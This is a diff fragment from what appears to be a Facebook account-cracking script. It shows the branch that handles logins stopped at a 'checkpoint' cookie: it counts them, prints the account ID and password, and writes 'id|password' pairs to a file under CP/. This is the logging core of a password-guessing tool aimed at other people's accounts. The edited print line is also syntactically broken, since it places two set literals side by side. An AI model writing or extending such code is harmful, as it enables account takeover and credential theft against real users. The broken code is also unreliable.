@@ -1828,7 +1828,7 @@ def reguler2(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'no' in gabriel:
 					cp+=1
-					print ('\r %s*--> %s ◊ %s ◊ %s %s %s '%(K,pengguna,pw,hari,bulan,tahun))
+					print ('\r %s*--> %s ◊ %s ◊ %s %s %s '%(K,{idf}{pw}))
 					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 					akun.append(idf+'|'+pw)
 					break
